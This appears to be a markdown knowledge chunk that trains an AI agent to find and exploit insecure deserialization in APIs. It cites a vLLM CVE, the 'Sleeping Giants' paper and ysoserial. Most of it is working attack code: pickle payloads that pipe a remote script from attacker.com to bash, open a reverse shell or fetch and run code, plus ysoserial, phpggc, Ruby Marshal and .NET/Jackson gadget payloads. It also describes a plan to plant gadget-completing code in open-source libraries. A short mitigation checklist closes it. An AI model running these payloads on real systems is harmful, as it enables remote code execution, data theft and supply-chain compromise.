# Deserialization & Gadget Chain Attacks — Agent Chunk 88a
> Source: CVE-2025-32444 vLLM advisory, "Sleeping Giants" arXiv paper (April 2025), ysoserial project, language-specific deserialization research
> Purpose: Teaches the agent to identify and exploit insecure deserialization across multiple languages, with focus on API-specific attack vectors and supply chain gadget chain completion
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing API endpoints that accept serialized data (binary payloads, custom Content-Types, pickle, Java objects, PHP serialized data). Deserialization vulnerabilities are critical severity because they typically lead directly to RCE. Check Content-Type headers and API documentation for serialization format indicators. The "Sleeping Giants" research adds a supply chain dimension: benign library updates can complete partial gadget chains.

---

## 1. CVE-2025-32444: vLLM — CVSS 10.0

### Background
vLLM is a high-throughput LLM serving framework used in production AI systems. The vulnerability allowed arbitrary code execution through Python pickle deserialization in the model loading pipeline.

```python
# vLLM accepted serialized model data via API
# The model weights/config were loaded using pickle.loads()
# without any validation or sandboxing

# Exploitation: craft a malicious "model" that executes code on load
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://attacker.com/shell.sh | bash',))

# Create malicious payload
payload = pickle.dumps(Exploit())

# Upload as "model weights" to vLLM API
import requests
requests.post('https://vllm.target.com/api/models/load', 
    data=payload,
    headers={'Content-Type': 'application/octet-stream'})
```

### Impact Assessment
```
- CVSS 10.0: Network-accessible, no auth required, full system compromise
- Affected: Any vLLM deployment accepting model uploads
- Context: AI/ML serving infrastructure often has GPU access,
  cloud credentials, and access to training data
- Lateral movement: from ML serving to data pipelines, model registries
```

---

## 2. "Sleeping Giants" Research (April 2025, arXiv)

### Core Concept
```
Traditional view: Gadget chains require ALL components to be present
in the application's classpath/dependencies at time of exploitation.

"Sleeping Giants" finding: Partial gadget chains can exist dormantly
in production applications. A routine library update can introduce
the MISSING piece that completes the chain.

Supply chain angle:
1. Attacker identifies partial gadget chain in target application
2. Attacker contributes benign, useful code to an open-source library
3. The contributed code happens to complete the partial gadget chain
4. Target updates the library (routine dependency update)
5. Previously unexploitable partial chain becomes fully exploitable
6. Attacker exploits the now-complete chain via deserialization endpoint
```

### Example: Java Partial Chain Completion
```java
// Application has: Step 1 (entry) and Step 3 (sink) of a gadget chain
// Missing: Step 2 (bridge class)

// Step 1 (exists): HashMap.readObject() triggers hashCode()
// Step 3 (exists): Runtime.exec() for command execution
// Missing Step 2: A class whose hashCode() leads to exec()

// Attacker's "helpful" contribution to a utility library:
public class CacheHelper implements Serializable {
    private Object transformer;
    
    @Override
    public int hashCode() {
        // "Optimization" that evaluates transformer
        return transformer.hashCode(); // Bridges to InvokerTransformer
    }
}
// This class is benign on its own but completes the gadget chain
```

### Detection Approach
```bash
# Scan for partial gadget chains in dependencies
# Tool: gadgetinspector (Java)
java -jar gadgetinspector.jar target-app.war

# Check for known gadget chain classes
grep -rP "(InvokerTransformer|ConstantTransformer|ChainedTransformer|LazyMap)" \
  target-app/WEB-INF/lib/*.jar

# Monitor dependency updates for classes that could complete chains
# Compare gadget chain analysis before and after library updates
```

---

## 3. Java Deserialization (ysoserial)

### ysoserial Status
```
- Last official commit: 2021 (stale)
- Still relevant: majority of gadget chains work against current libraries
- Many production Java applications use vulnerable library versions
- Fork "ysoserial-modified" has newer chains
```

### Common Gadget Chains
```bash
# Generate payload with ysoserial
# CommonsCollections1 (Apache Commons Collections 3.1)
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell.sh|bash' > payload.bin

# CommonsCollections5 (works without SecurityManager)
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin

# CommonsBeanutils1 (Apache Commons BeanUtils)
java -jar ysoserial.jar CommonsBeanutils1 'id' > payload.bin

# Send via API
curl -X POST https://api.target.com/api/import \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### Detection in API Traffic
```bash
# Java serialized objects start with magic bytes: AC ED 00 05
# Base64-encoded: rO0ABQ==
# Gzip+Base64: H4sIAAAA...

# Check API for Java serialization indicators:
# 1. Content-Type headers
grep -i "java-serialized\|x-java\|application/x-java" proxy_logs.txt

# 2. Binary payloads starting with AC ED
xxd request_body.bin | head -1
# 0000000: aced 0005 ...

# 3. Base64 bodies starting with rO0
echo "rO0ABXNyAB..." | base64 -d | xxd | head -1
```

---

## 4. Python Pickle Deserialization

### Exploitation Patterns
```python
import pickle, base64, os

# Basic RCE payload
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Reverse shell payload
class RevShell:
    def __reduce__(self):
        return (os.system, (
            'python3 -c \'import socket,subprocess;'
            's=socket.socket();s.connect(("attacker.com",4444));'
            'subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),'
            'stdout=s.fileno(),stderr=s.fileno())\'',
        ))

# Multi-stage payload (download and execute)
class Staged:
    def __reduce__(self):
        return (exec, (
            'import urllib.request;'
            'urllib.request.urlretrieve("https://attacker.com/payload.py","/tmp/p.py");'
            'exec(open("/tmp/p.py").read())',
        ))
```

### API Vectors for Pickle
```bash
# Common API endpoints accepting pickle data:
# - ML model serving (model weights, preprocessors)
# - Session stores (Redis/Memcached with pickle serialization)
# - Caching layers (pickled response objects)
# - Data science APIs (pandas DataFrames, numpy arrays)

# Test: send pickle payload via API
curl -X POST https://api.target.com/api/predict \
  -H "Content-Type: application/octet-stream" \
  --data-binary @pickle_payload.bin

# Alternative: Base64-encoded pickle in JSON
curl -X POST https://api.target.com/api/process \
  -H "Content-Type: application/json" \
  -d '{"data":"gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="}'
```

---

## 5. PHP Deserialization (unserialize)

```php
// Dangerous pattern in API:
$data = unserialize($_POST['data']);  // Never do this

// Exploitation payload:
// PHP object with __destruct or __wakeup magic methods
```

```bash
# PHP serialized object format:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Test for PHP deserialization in API:
curl -X POST https://api.target.com/api/import \
  -H "Content-Type: application/x-php-serialized" \
  -d 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}'

# POP chain exploitation (requires known classes in application)
# Tool: phpggc - PHP Generic Gadget Chains
phpggc Laravel/RCE1 system id
# Generates serialized payload exploiting Laravel gadget chain

# Common framework chains:
phpggc Symfony/RCE4 exec id              # Symfony
phpggc WordPress/RCE1 exec id            # WordPress
phpggc Magento/SQLI1 "SELECT * FROM admin_user"  # Magento
```

---

## 6. Ruby Marshal Deserialization

```ruby
# Ruby Marshal.load() is equivalent to pickle.loads() - arbitrary code execution
# Detection: Base64 data starting with BAh (Marshal magic bytes \x04\x08)

# Payload generation:
require 'erb'

class Exploit
  def initialize
    @src = '`id`'  # Backtick executes command
    @filename = 'x'
    @lineno = 0
  end
end

payload = Marshal.dump(ERB.allocate.tap { |e|
  e.instance_variable_set(:@src, '`id`')
  e.instance_variable_set(:@filename, 'x')
  e.instance_variable_set(:@lineno, 0)
})
```

```bash
# API testing for Ruby Marshal
# Look for Content-Type: application/x-ruby-marshal
# or Base64 bodies starting with BAh

curl -X POST https://api.target.com/api/session \
  -H "Content-Type: application/x-ruby-marshal" \
  --data-binary @marshal_payload.bin
```

---

## 7. JSON Deserialization — Beyond Prototype Pollution

```javascript
// .NET JSON deserialization (Json.NET TypeNameHandling)
// Payload in JSON that triggers object instantiation:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd",
      "Arguments": "/c calc"
    }
  }
}

// Jackson (Java) polymorphic deserialization
// Requires @JsonTypeInfo annotation on target class
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exploit",
  "autoCommit": true
}
```

```bash
# Test for .NET TypeNameHandling
curl -X POST https://api.target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"$type":"System.String","value":"test"}'
# If no error about $type: TypeNameHandling may be enabled

# Test for Jackson polymorphic
curl -X POST https://api.target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"@class":"java.util.HashMap","key":"value"}'
```

---

## 8. Mitigation Checklist
- Never deserialize untrusted data (pickle, Marshal, Java ObjectInputStream, PHP unserialize)
- Use safe serialization formats: JSON, Protocol Buffers, MessagePack (data only, no code)
- Java: use look-ahead deserialization with allowlists (SerialKiller, notsoserial)
- Python: use `json.loads()` instead of `pickle.loads()` for API data
- .NET: set `TypeNameHandling.None` (default) in Json.NET; never use `Auto` or `All`
- PHP: use `json_decode()` instead of `unserialize()` for API data
- Monitor dependency updates for classes that complete partial gadget chains
- Implement deserialization firewalls (RASP) that block known gadget chain classes
- Scan dependencies with gadgetinspector or equivalent before deployment
